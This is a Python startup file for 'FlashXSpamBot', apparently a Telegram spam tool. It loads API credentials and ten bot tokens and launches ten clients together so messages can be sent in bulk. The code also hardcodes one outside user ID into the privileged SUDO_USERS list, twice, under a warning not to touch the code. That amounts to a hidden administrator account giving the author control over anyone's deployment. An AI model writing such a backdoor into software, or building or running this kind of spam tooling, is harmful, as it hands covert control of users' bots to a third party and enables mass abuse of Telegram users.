# FlashXSpamBot || @Flash_Support_Group
# Copyright © 2021 @Flash_Support_Group

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

flashversion = "v2.0.3"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5120313803 not in SUDO_USERS:
    SUDO_USERS.append(5120313803)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5120313803)

# Tokens

Fla = TelegramClient('Fla', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

Fla2 = TelegramClient('Fla2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

FLa3 = TelegramClient('Fla3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

Fla4 = TelegramClient('Fla4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

Fla5 = TelegramClient('Fla5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

Fla6 = TelegramClient('Fla6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

Fla7 = TelegramClient('Fla7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

Fla8 = TelegramClient('Fla8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

Fla9 = TelegramClient('Fla9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

Fla10 = TelegramClient('Fla10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

